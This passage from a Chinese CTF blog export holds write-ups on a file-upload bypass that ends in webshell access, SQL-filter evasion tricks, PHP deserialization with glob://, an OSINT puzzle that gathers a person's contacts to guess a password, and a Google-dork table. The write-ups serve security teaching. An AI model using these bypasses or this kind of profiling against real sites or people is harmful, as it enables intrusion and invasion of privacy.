class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>];<br><span class="hljs-variable">$newname</span> = preg_replace(<span class="hljs-string">&#x27;/.+(\.[a-z]+)$/i&#x27;</span>, md5(time()) . <span class="hljs-string">&#x27;\1&#x27;</span>, <span class="hljs-variable">$oldname</span>);<br><span class="hljs-keyword">if</span> (((<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;type&quot;</span>] == <span class="hljs-string">&quot;image/gif&quot;</span>) || (<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;type&quot;</span>] == <span class="hljs-string">&quot;image/jpeg&quot;</span>) || (<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;type&quot;</span>] == <span class="hljs-string">&quot;image/jpg&quot;</span>) || (<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;type&quot;</span>] == <span class="hljs-string">&quot;image/pjpeg&quot;</span>) || (<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;type&quot;</span>] == <span class="hljs-string">&quot;image/x-png&quot;</span>) || (<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;type&quot;</span>] == <span class="hljs-string">&quot;image/png&quot;</span>)) &amp;&amp; (<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;size&quot;</span>] &lt; <span class="hljs-number">204800</span>)) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;error&quot;</span>] &gt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;错误：: &quot;</span> . <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;error&quot;</span>] . <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (file_exists(<span class="hljs-string">&quot;upload/&quot;</span> . <span class="hljs-variable">$newname</span>)) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-variable">$newname</span> . <span class="hljs-string">&quot; 文件已存在&quot;</span>);<br>    &#125;<br>    move_uploaded_file(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>], <span class="hljs-string">&quot;upload/&quot;</span> . <span class="hljs-variable">$newname</span>);<br>    <span class="hljs-variable">$alldata</span> = file_get_contents(<span class="hljs-string">&quot;upload/&quot;</span> . <span class="hljs-variable">$newname</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$alldata</span>;<br>    <span class="hljs-keyword">if</span> (strpos(<span class="hljs-variable">$alldata</span>, <span class="hljs-string">&quot;&lt;?php&quot;</span>) !== <span class="hljs-literal">false</span>) &#123;<br>        unlink(<span class="hljs-string">&quot;upload/&quot;</span> . <span class="hljs-variable">$newname</span>);<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;臭弟弟，文件里写了啥呢&quot;</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;上传文件名: &quot;</span> . <span class="hljs-variable">$newname</span> . <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;文件类型: &quot;</span> . <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;type&quot;</span>] . <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;文件存储在: &quot;</span> . <span class="hljs-string">&quot;upload/&quot;</span> . <span class="hljs-variable">$newname</span> . <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>    &#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;臭弟弟，不是图片不收嗷&quot;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>关于文件上传题，我个人的一般做法是先传一个正常的文件上去，先瞅瞅回显，然后尝试一点点的“让这个文件变得不正常”，来测试网站对上传文件的过滤程度，当然这是对于一般的文件上传题，还有类似于利用 .htaccess 和 .user.ini 绕过上传，上传 phar 文件触发反序列化等等，这里就不多讲了，感兴趣的可以自己去查查</p><p>在这个题中</p><p>MIME 的检测抓包直接改就行</p><p>内容的检测换一个不用这个的马就行</p><p>其实给出源码后还有一种做法，因为在这个部分</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php">move_uploaded_file(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>], <span class="hljs-string">&quot;upload/&quot;</span> . <span class="hljs-variable">$newname</span>);<br>    <span class="hljs-variable">$alldata</span> = file_get_contents(<span class="hljs-string">&quot;upload/&quot;</span> . <span class="hljs-variable">$newname</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$alldata</span>;<br>    <span class="hljs-keyword">if</span> (strpos(<span class="hljs-variable">$alldata</span>, <span class="hljs-string">&quot;&lt;?php&quot;</span>) !== <span class="hljs-literal">false</span>) &#123;<br>        unlink(<span class="hljs-string">&quot;upload/&quot;</span> . <span class="hljs-variable">$newname</span>);<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;臭弟弟，文件里写了啥呢&quot;</span>);<br>    &#125;<br></code></pre></td></tr></table></figure><p>是先生成了文件，再进行判断是否选择删除的，所以可以利用条件竞争漏洞，也就是“只要我访问的够快，删除文件就跟不上我”，当然这个题用不了这么麻烦</p><p>不用条件竞争的上传一句话之后，用菜刀用蚁剑连一下，就能看到flag了</p><h4 id="flag-7"><a href="#flag-7" class="headerlink" title="flag"></a>flag</h4><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">flag</span>&#123;<span class="hljs-attribute">check_everything_carefully</span>:)&#125;<br></code></pre></td></tr></table></figure><p><strong>最后两个题就不细写了，提几个点就行，主要是我懒</strong></p><h3 id="SimpleSQL"><a href="#SimpleSQL" class="headerlink" title="SimpleSQL"></a>SimpleSQL</h3><h4 id="检测部分的源码："><a href="#检测部分的源码：" class="headerlink" title="检测部分的源码："></a>检测部分的源码：</h4><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">waf</span>(<span class="hljs-params">$id</span>) </span>&#123;<br><span class="hljs-symbol">$id</span>= preg_replace(<span class="hljs-string">&#x27;/or/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-symbol">$id</span>);<br><span class="hljs-symbol">$id</span>= preg_replace(<span class="hljs-string">&#x27;/[--]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-symbol">$id</span>);<br><span class="hljs-symbol">$id</span>= preg_replace(<span class="hljs-string">&#x27;/and/i&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-symbol">$id</span>);<br><span class="hljs-symbol">$id</span>= preg_replace(<span class="hljs-string">&#x27;/[=]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-symbol">$id</span>);<br><span class="hljs-symbol">$id</span>= preg_replace(<span class="hljs-string">&#x27;/[+]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-symbol">$id</span>);<br><span class="hljs-symbol">$id</span>= preg_replace(<span class="hljs-string">&#x27;/[\s]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-symbol">$id</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-symbol">$id</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>preg_replace 导致 or 和 and 是可以双写绕过的</p><p>= 可以用 like 代替，如果 like 也被过滤了可以用 in 或者 between 或者用小于大于符号跑个程序都是可以的</p><p>空格可以用 /**/ 代替，如果注释被过滤了也可以考虑用括号，用换行等等</p><p>方法很多，可以慢慢收集各种花里胡哨的姿势</p><p>剩下的内容就和 easysql 没什么区别了</p><p>至于如何看出来过滤内容的，其实常规的测试语句通过报错内容就能看出来了</p><h4 id="2020-10-18-补充"><a href="#2020-10-18-补充" class="headerlink" title="2020.10.18 补充"></a>2020.10.18 补充</h4><p>补充一下，有同学问我为什么输入 username = jiji’ anandd ‘1’ = ‘2 和 password = wsfw 回显正常</p><p>首先，后端的 sql 语句是 select * from user where username = ‘$username’ and password = ‘$password’ ，如果按那样填写，再经过过滤，语句会变成 select * from user where username = ‘jiji’and’1’’2’ and password = ‘wsfw’，放在 mysql 里面测试（自己建一个数据库然后测试也是一种手段），确实不会报错，但是会有一个 warning ，所以返回的结果还是正常的</p><p><a href="https://imgchr.com/i/0XH8ER"><img src="https://s1.ax1x.com/2020/10/18/0XH8ER.png" alt="0XH8ER.png" style="zoom:80%;" /></a></p><p>因为在 mysql 的标准中，引用字符串常量时需要用一对英文单引号或一对英文双引号将字符串常量括起来，所以如果在使用<strong>一对英文单引号</strong>包裹常量的情况下，如果字符串常量中需要包含单引号，就需要使用<strong>两个单引号</strong>，即 ‘’ 或者<strong>使用斜线加单引号</strong>，即 \‘ 来进行转义，所以在这个地方的 ‘1’’2’ 就会被识别成字符串 1’2 。</p><p><a href="https://imgchr.com/i/0XHT5q"><img src="https://s1.ax1x.com/2020/10/18/0XHT5q.png" alt="0XHT5q.png" style="zoom: 80%;" /></a></p><p>肯定有人会问，这里 warning 里面说的是  INTERGER 类型啊？确实，确实是 INTERGER 类型，这个就要说到 mysql 的类型转换和 where 的本质了，where 实际上是把后面的条件判断完成后将结果转换成数字后和 0 进行判断的，所以 where ‘1’’2’ 是把 ‘1’’2’ 转换成了数字再进行判断，而本身 1’2 是一个字符串，mysql 对于字符串转数字的处理方式是针对<strong>不满足数字正则的字符串</strong>会取<strong>最前面满足数字正则的部分</strong>进行获取（同时会很生草的给个warning），就比如下面</p><p><a href="https://imgchr.com/i/0XLfKO"><img src="https://s1.ax1x.com/2020/10/18/0XLfKO.png" alt="0XLfKO.png" style="zoom:80%;" /></a></p><p>所以 1’2 转换成数字后就是 1 ，where 恒为真，select 自然不会出毛病</p><p>为了验证这一点，测试 ‘0’’1’，预期上这个字符串会被转换成数字 0 ，where 恒假，select 不会有任何结果，实际上通过测试我们发现确实如此</p><p><a href="https://imgchr.com/i/0XOMJ1"><img src="https://s1.ax1x.com/2020/10/18/0XOMJ1.png" alt="0XOMJ1.png"></a></p><p>现在知道为什么那个回显正常了吧？</p><h3 id="SimplePHP"><a href="#SimplePHP" class="headerlink" title="SimplePHP"></a>SimplePHP</h3><h4 id="源码：-3"><a href="#源码：-3" class="headerlink" title="源码："></a>源码：</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MyDirectory</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>; <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>) </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;name = <span class="hljs-variable">$name</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable">$num</span> = count(scandir(<span class="hljs-keyword">$this</span>-&gt;name)); <br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$num</span> &gt; <span class="hljs-number">0</span>)&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;count <span class="hljs-subst">$num</span> files&quot;</span>; <br>        &#125; <span class="hljs-keyword">else</span> &#123;        <br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;flag path is /app/flag-&#123;&#123;md5&#125;&#125;&quot;</span>; <br>            <span class="hljs-comment">//only 8 bit</span><br>            <span class="hljs-comment">//only num and lower case letters</span><br>            <span class="hljs-comment">//flag filename is flag.php</span><br>        &#125;<br>    &#125;<br>&#125;<br> <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MyFile</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$user</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$user</span></span>) </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;name = <span class="hljs-variable">$name</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;user = <span class="hljs-variable">$user</span>; <br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> file_get_contents(<span class="hljs-keyword">$this</span>-&gt;name);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(stristr(<span class="hljs-keyword">$this</span>-&gt;name, <span class="hljs-string">&quot;flag&quot;</span>)!==<span class="hljs-literal">False</span>) <br>            <span class="hljs-keyword">$this</span>-&gt;name = <span class="hljs-string">&quot;/app/first&quot;</span>;<br>        <span class="hljs-keyword">else</span><br>            <span class="hljs-keyword">$this</span>-&gt;name = <span class="hljs-string">&quot;/app/second&quot;</span>; <br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;user&#x27;</span>])) &#123;<br>            <span class="hljs-keyword">$this</span>-&gt;user = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;user&#x27;</span>]; <br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-keyword">$this</span>; <br>    &#125;<br>&#125;<br> <br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;input&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$input</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;input&#x27;</span>]; <br><br>    <span class="hljs-keyword">if</span>(stristr(<span class="hljs-variable">$input</span>, <span class="hljs-string">&#x27;user&#x27;</span>)!==<span class="hljs-literal">False</span>)&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Hacker&#x27;</span>); <br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        unserialize(<span class="hljs-variable">$input</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span> &#123; <br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>重点有两个</p><p>一个是怎么获取到 flag 文件所在的目录名</p><p>一个是怎么绕开 stristr 对 $this-&gt;name 的替换</p><p>对应的 hint 其实基本已经把这个题讲完了</p><p>分别的解决办法是</p><p>1、利用 <strong>php glob://</strong> 获取到 flag 文件所在的目录名</p><p>这里给一个 Example 体会一下它的作用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// 循环 ext/spl/examples/ 目录里所有 *.php 文件</span><br><span class="hljs-comment">// 并打印文件名和文件尺寸</span><br><span class="hljs-variable">$it</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">DirectoryIterator</span>(<span class="hljs-string">&quot;glob://ext/spl/examples/*.php&quot;</span>);<br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$it</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$f</span>) &#123;<br>    printf(<span class="hljs-string">&quot;%s: %.1FK\n&quot;</span>, <span class="hljs-variable">$f</span>-&gt;getFilename(), <span class="hljs-variable">$f</span>-&gt;getSize()/<span class="hljs-number">1024</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>2、利用 <strong>浅 copy</strong> 绕开 stristr 对 $this-&gt;name 的替换</p><p>这个也给一个 Example 体会一下它的作用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Example</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;name = <span class="hljs-variable">$name</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$ex1</span> = <span class="hljs-keyword">new</span> Example(<span class="hljs-string">&#x27;test1&#x27;</span>);<br><br><span class="hljs-variable">$ex2</span> = <span class="hljs-variable">$ex1</span>;<br><br><span class="hljs-keyword">echo</span> (<span class="hljs-string">&#x27;ex1:&#x27;</span>.<span class="hljs-variable">$ex1</span>-&gt;name.<span class="hljs-string">&#x27;ex2:&#x27;</span>.<span class="hljs-variable">$ex2</span>-&gt;name);<br><br><span class="hljs-variable">$ex2</span>-&gt;name = <span class="hljs-string">&#x27;test2&#x27;</span>;<br><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\r\n&quot;</span>;<br><span class="hljs-keyword">echo</span> (<span class="hljs-string">&#x27;ex1:&#x27;</span>.<span class="hljs-variable">$ex1</span>-&gt;name.<span class="hljs-string">&#x27;ex2:&#x27;</span>.<span class="hljs-variable">$ex2</span>-&gt;name);<br></code></pre></td></tr></table></figure><p>可以自己拿去跑一跑感受一下</p><p>剩下的就不说了</p><h3 id="社会工程学"><a href="#社会工程学" class="headerlink" title="社会工程学"></a>社会工程学</h3><p>这个题纯粹就是出着玩，全靠群里的 <strong>欧尼酱daisuki</strong> 给的灵感，阿里嘎多</p><p>关键词：sipana、创作平台</p><p>创作平台不难找，就是简书，直接搜索 sipana 就能找到账户了</p><p>然后多看看就能找到，qq邮箱，生日的具体时间</p><p>然后访问 qq 空间能看到手机号</p><p>访问 qq 相册会有一个提示</p><p>最后收集到的线索就有</p><blockquote><p>用户名</p><p>qq 号</p><p>手机号</p><p>生日</p><p>密码组成</p><p>存在冗余信息</p></blockquote><p>既然我说不要破坏环境那多半是要登陆了，但是密码不好猜，猜不到很正常</p><p>这里给出更多的线索</p><p>1、手机号是冗余信息</p><p>2、数字一共8位，由两部分组成</p><p>3、存在大写字母</p><p>猜中了密码就请登陆账号进行下一步的探索；）</p><p>拿到 flag 后可以找我私聊，奖励是一道真实环境下的社工hhhhhhhhhh</p><p>（当然，猫猫和猫咖的照片都是真实的，翻相册翻到的，可惜中间有一次手机格式化，好多猫猫图都没了，落泪</p><p>（然后我的手机最近又格式化了一次，这波是所有的猫猫图都没了，我傻了</p>]]></content>
    
    
    <categories>
      
      <category>wp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>wp</tag>
      
      <tag>Jotang</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Google Hack</title>
    <link href="/2020/10/31/GoogleHack/"/>
    <url>/2020/10/31/GoogleHack/</url>
    
    <content type="html"><![CDATA[<h3 id="Google-Hack"><a href="#Google-Hack" class="headerlink" title="Google Hack"></a>Google Hack</h3><table><thead><tr><th>关键字</th><th>说明</th></tr></thead><tbody><tr><td>site</td><td>指定域名</td></tr><tr><td>intext</td><td>正文中存在关键字的网页</td></tr><tr><td>intitle</td><td>标题中存在关键字的网页</td></tr><tr><td>info</td><td>一些基本信息</td></tr><tr><td>inurl</td><td>URL存在关键字的网页</td></tr><tr><td>filetype</td><td>搜索指定文件类型</td></tr></tbody></table><p><a href="https://imgchr.com/i/Bpf3on"><img src="https://s1.ax1x.com/2020/10/20/Bpf3on.png" alt="Bpf3on.png"></a></p>]]></content>
    
    
    <categories>
      
      <category>信息收集</category>
      
    </categories>
    
    
    <tags>
      
      <tag>信息收集</tag>
      
      <tag>Google Hack</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
